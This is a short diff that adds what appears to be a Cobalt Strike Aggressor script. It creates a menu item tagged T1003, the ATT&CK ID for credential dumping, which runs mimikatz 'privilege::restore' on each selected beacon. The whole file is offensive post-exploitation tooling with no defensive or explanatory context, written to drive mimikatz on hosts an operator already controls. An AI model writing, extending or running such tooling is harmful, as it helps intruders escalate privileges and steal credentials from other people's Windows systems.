@@ -1,0 +1,13 @@
+# Mimikatz Restore Privilege
+item "Restore Privilege  - T1003"{
+	local ('$bid');
+		foreach $bid ($1){
+			restore($bid);
+		}
+}
+
+
+#Mimikatz Restore Privilege
+sub restore{
+bmimikatz($1, "privilege::restore");
+}
